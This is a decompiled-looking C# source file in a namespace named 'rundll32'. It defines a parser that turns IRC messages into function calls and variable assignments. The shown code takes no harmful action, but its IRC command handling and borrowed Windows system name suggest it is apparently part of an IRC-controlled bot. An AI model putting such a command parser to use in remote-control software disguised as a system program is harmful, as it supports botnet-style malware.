using System;
using System.Collections.Generic;

namespace rundll32;

internal class functionParser
{
	public static List<functionVariable> Variables = new List<functionVariable>();

	public static functionResponse parse(ircMessage input)
	{
		return parse(input.message);
	}

	public static functionResponse parse(string input)
	{
		try
		{
			if (input.Contains("(") && input.Contains(")"))
			{
				if (input.IndexOf('(') < input.LastIndexOf(')'))
				{
					string text = input.Substring(0, input.IndexOf('(')).Replace(" ", "");
					if (IsLetters(text))
					{
						int num = input.IndexOf("(") + 1;
						int num2 = input.LastIndexOf(")");
						string text2 = input.Substring(num, num2 - num);
						string text3 = text2;
						string text4 = "";
						int startIndex = 0;
						bool flag = true;
						List<int[]> list = new List<int[]>();
						while (flag)
						{
							try
							{
								int num3 = text3.IndexOf("\"", startIndex) + 1;
								if (num3 == 0)
								{
									throw new Exception();
								}
								int num4 = text3.IndexOf("\"", num3 + 1);
								if (num4 == 0)
								{
									throw new Exception();
								}
								int num5 = num4 - num3;
								while (text4.Length != num3)
								{
									text4 += "?";
								}
								for (int i = 0; i < num5; i++)
								{
									text4 += text3[num3 + i];
								}
								string text5 = "";
								while (text5.Length != num5)
								{
									text5 += "?";
								}
								string text6 = text3.Substring(0, num3);
								string text7 = text3.Substring(num4);
								text3 = text6 + text5 + text7;
								startIndex = num4 + 1;
								list.Add(new int[2] { num3, num4 });
							}
							catch
							{
								flag = false;
								while (text4.Length < text3.Length)
								{
									text4 += "?";
								}
							}
						}
						text3 = text3.Replace(',', '\n');
						foreach (int[] item in list)
						{
							int num6 = item[0];
							int num7 = item[1];
							int length = num7 - num6;
							string text8 = text3.Substring(0, num6);
							string text9 = text3.Substring(num7);
							string text10 = text4.Substring(num6, length);
							text3 = text8 + text10 + text9;
						}
						string[] array = text3.Split(new char[1] { '\n' });
						functionVariable[] array2 = new functionVariable[array.Length];
						for (int j = 0; j < array.Length; j++)
						{
							string value = array[j];
							array2[j] = toFunctionVariable(value);
						}
						if (array2.Length == 1 && array2[0] == null)
						{
							array2 = new functionVariable[0];
						}
						return new functionResponse(text, array2);
					}
					return null;
				}
				return null;
			}
			string[] array3 = input.Split(new char[1] { '=' });
			if (array3.Length == 2)
			{
				array3[0] = array3[0].Replace(" ", "");
				if (IsLetters(array3[0]))
				{
					if (array3[1].EndsWith(";"))
					{
						array3[1] = array3[1].Substring(0, array3[1].Length - 1);
						if (array3[1].Contains("\""))
						{
							string[] array4 = array3[1].Split(new char[1] { '"' });
							if (array4.Length == 3)
							{
								string text11 = array3[0];
								string value2 = array4[1];
								foreach (functionVariable variable in Variables)
								{
									if (variable.Name.Equals(text11))
									{
										Variables[Variables.IndexOf(variable)].Value = value2;
										return null;
									}
								}
								Variables.Add(new functionVariable(text11, value2));
								return null;
							}
							return null;
						}
						if (IsLetters(array3[1].Replace(" ", "")))
						{
							if (array3[0].ToLower().Equals("false") && array3[0].ToLower().Equals("true"))
							{
								return null;
							}
							array3[1] = array3[1].Replace(" ", "");
							if (array3[1].ToLower() != "false" && array3[1].ToLower() != "true")
							{
								string text12 = array3[0];
								object obj2 = null;
								foreach (functionVariable variable2 in Variables)
								{
									if (variable2.Name.Equals(array3[1]))
									{
										obj2 = variable2.Value;
									}
								}
								if (obj2 != null)
								{
									foreach (functionVariable variable3 in Variables)
									{
										if (variable3.Name.Equals(text12))
										{
											Variables[Variables.IndexOf(variable3)].Value = obj2;
											return null;
										}
									}
								}
								Variables.Add(new functionVariable(text12, obj2));
								return null;
							}
							string text13 = array3[0];
							bool flag2 = false;
							if (array3[1].ToLower() == "true")
							{
								flag2 = true;
							}
							foreach (functionVariable variable4 in Variables)
							{
								if (variable4.Name.Equals(text13))
								{
									Variables[Variables.IndexOf(variable4)].Value = flag2;
									return null;
								}
							}
							Variables.Add(new functionVariable(text13, flag2));
							return null;
						}
						if (IsNumbers(array3[1].Replace(" ", "")))
						{
							string text14 = array3[0];
							int num8 = int.Parse(array3[1].Replace(" ", ""));
							foreach (functionVariable variable5 in Variables)
							{
								if (variable5.Name.Equals(text14))
								{
									Variables[Variables.IndexOf(variable5)].Value = num8;
									return null;
								}
							}
							Variables.Add(new functionVariable(text14, num8));
							return null;
						}
						return null;
					}
					return null;
				}
				return null;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	private static bool IsLetters(string inputStr)
	{
		inputStr = inputStr.Replace(".", "").Replace(":", "");
		if (string.IsNullOrEmpty(inputStr))
		{
			return false;
		}
		int num = 0;
		int num2 = 0;
		while (true)
		{
			if (num2 < inputStr.Length)
			{
				if (char.IsNumber(inputStr[num2]))
				{
					num++;
				}
				if (!char.IsLetter(inputStr[num2]) && !char.IsNumber(inputStr[num2]))
				{
					break;
				}
				num2++;
				continue;
			}
			if (num == inputStr.Length)
			{
				return false;
			}
			return true;
		}
		return false;
	}

	private static bool IsNumbers(string inputStr)
	{
		if (string.IsNullOrEmpty(inputStr))
		{
			return false;
		}
		int num = 0;
		while (true)
		{
			if (num < inputStr.Length)
			{
				if (!char.IsNumber(inputStr[num]))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static functionVariable toFunctionVariable(string value)
	{
		if (value.Contains("\""))
		{
			string[] array = value.Split(new char[1] { '"' });
			if (array.Length == 3)
			{
				value = array[1];
				return new functionVariable("temp", value);
			}
			return null;
		}
		if (IsLetters(value.Replace(" ", "")))
		{
			value = value.Replace(" ", "");
			object obj = null;
			foreach (functionVariable variable in Variables)
			{
				if (variable.Name.Equals(value))
				{
					obj = variable.Value;
				}
			}
			if (obj != null)
			{
				return new functionVariable(value, obj);
			}
			return null;
		}
		if (IsNumbers(value.Replace(" ", "")))
		{
			int num = int.Parse(value.Replace(" ", ""));
			return new functionVariable("temp", num);
		}
		return null;
	}
}
